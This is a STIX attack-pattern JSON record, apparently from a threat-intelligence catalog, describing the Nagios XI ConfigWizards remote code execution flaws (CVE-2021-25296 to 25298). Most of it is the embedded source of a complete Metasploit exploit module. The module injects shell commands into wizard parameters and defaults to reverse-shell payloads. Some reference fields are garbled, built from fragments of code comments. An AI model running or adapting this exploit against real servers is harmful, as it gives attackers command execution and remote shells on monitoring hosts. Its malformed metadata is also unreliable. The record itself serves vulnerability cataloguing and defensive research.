{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6027fa5-771d-495f-9ca9-57ecc9bb6d5f",
    "created": "2024-08-14T17:03:48.531453Z",
    "modified": "2024-08-14T17:03:48.531457Z",
    "name": "Nagios XI 5.5.6 to 5.7.5 - ConfigWizards Authenticated Remote Code Exection",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_configwizards_authenticated_rce.rb",
            "external_id": "nagios_xi_configwizards_authenticated_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-25296"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-25297"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-25298"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs/blob/main/README.md"
        },
        {
            "source_name": "#Afterversion5.5.7",
            "external_id": "theURLparameterusedinCVE-2021-25297andCVE-2021-25298"
        },
        {
            "source_name": "#CVE-2021-25298affectsthecloud-vmconfigurationwizard",
            "external_id": "whichwecanaccessby"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::NagiosXi\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nagios XI 5.5.6 to 5.7.5 - ConfigWizards Authenticated Remote Code Exection',\n        'Description' => %q{\n          This module exploits CVE-2021-25296, CVE-2021-25297, and CVE-2021-25298, which are\n          OS command injection vulnerabilities in the windowswmi, switch, and cloud-vm\n          configuration wizards that allow an authenticated user to perform remote code\n          execution on Nagios XI versions 5.5.6 to 5.7.5 as the apache user.\n\n          Valid credentials for a Nagios XI user are required. This module has\n          been successfully tested against official NagiosXI OVAs from 5.5.6-5.7.5.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Matthew Mathur'\n        ],\n        'References' => [\n          ['CVE', '2021-25296'],\n          ['CVE', '2021-25297'],\n          ['CVE', '2021-25298'],\n          ['URL', 'https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs/blob/main/README.md']\n        ],\n        'Platform' => %w[linux unix],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD ],\n        'Targets' => [\n          [\n            'Linux (x86)', {\n              'Arch' => [ ARCH_X86 ],\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Linux (x64)', {\n              'Arch' => [ ARCH_X64 ],\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'CMD', {\n              'Arch' => [ ARCH_CMD ],\n              'Platform' => 'unix',\n              # the only reliable payloads against a typical Nagios XI host (CentOS 7 minimal) seem to be cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl_ssl' }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 2,\n        'DisclosureDate' => '2021-02-13',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('TARGET_CVE', [true, 'CVE to exploit (CVE-2021-25296, CVE-2021-25297, or CVE-2021-25298)', 'CVE-2021-25296'])\n    ]\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def finish_install\n    datastore['FINISH_INSTALL']\n  end\n\n  def check\n    # Authenticate to ensure we can access the NagiosXI version\n    auth_result, err_msg, @auth_cookies, @version, @nsp = authenticate(username, password, finish_install, true, true, true)\n    case auth_result\n    when AUTH_RESULTS[:connection_failed]\n      return CheckCode::Unknown(err_msg)\n    when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n      return CheckCode::Detected(err_msg)\n    when AUTH_RESULTS[:not_nagios_application]\n      return CheckCode::Safe(err_msg)\n    end\n\n    if @version >= Rex::Version.new('5.5.6') && @version <= Rex::Version.new('5.7.5')\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    if !@nsp || !@auth_cookies # Check to see if we already authenticated during the check\n      auth_result, err_msg, @auth_cookies, @version, @nsp = authenticate(username, password, finish_install, true, true, true)\n      case auth_result\n      when AUTH_RESULTS[:connection_failed]\n        return CheckCode::Unknown(err_msg)\n      when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n        return CheckCode::Detected(err_msg)\n      when AUTH_RESULTS[:not_nagios_application]\n        return CheckCode::Safe(err_msg)\n      end\n    end\n\n    # execute payload based on the selected targeted configuration wizard\n    url_params = {\n      'update' => 1,\n      'nsp' => @nsp\n    }\n    # After version 5.5.7, the URL parameter used in CVE-2021-25297 and CVE-2021-25298\n    # changes from address to ip_address\n    if @version <= Rex::Version.new('5.5.7')\n      address_param = 'address'\n    else\n      address_param = 'ip_address'\n    end\n\n    # CVE-2021-25296 affects the windowswmi configuration wizard.\n    if datastore['TARGET_CVE'] == 'CVE-2021-25296'\n      url_params = url_params.merge({\n        'nextstep' => 3,\n        'wizard' => 'windowswmi',\n        'ip_address' => Array.new(4) { rand(256) }.join('.'),\n        'domain' => Rex::Text.rand_text_alphanumeric(7..15),\n        'username' => Rex::Text.rand_text_alphanumeric(7..20),\n        'password' => Rex::Text.rand_text_alphanumeric(7..20),\n        'plugin_output_len' => Rex::Text.rand_text_numeric(5) + \"; #{cmd};\"\n      })\n    # CVE-2021-25297 affects the switch configuration wizard.\n    elsif datastore['TARGET_CVE'] == 'CVE-2021-25297'\n      url_params = url_params.merge({\n        'nextstep' => 3,\n        'wizard' => 'switch',\n        address_param => Array.new(4) { rand(256) }.join('.') + \"\\\"; #{cmd};\",\n        'snmpopts[snmpcommunity]' => Rex::Text.rand_text_alphanumeric(7..15),\n        'scaninterfaces' => 'on'\n      })\n    # CVE-2021-25298 affects the cloud-vm configuration wizard, which we can access by\n    # specifying the digitalocean option for the wizard parameter.\n    elsif datastore['TARGET_CVE'] == 'CVE-2021-25298'\n      url_params = url_params.merge({\n        address_param => Array.new(4) { rand(256) }.join('.') + \"; #{cmd};\",\n        'nextstep' => 4,\n        'wizard' => 'digitalocean'\n      })\n    else\n      fail_with(Failure::BadConfig, 'Invalid TARGET_CVE: Choose CVE-2021-25296, CVE-2021-25297, or CVE-2021-25298.')\n    end\n\n    print_status('Sending the payload...')\n    # Send the final request. Note that the target is not expected to respond if we get\n    # code execution. Therefore, we set the timeout on this request to 0.\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => '/nagiosxi/config/monitoringwizard.php',\n      'cookie' => @auth_cookies,\n      'vars_get' => url_params\n    })\n  end\n\n  def exploit\n    if target.arch.first == ARCH_CMD\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-02-13",
    "x_mitre_platforms": [
        "unix'"
    ]
}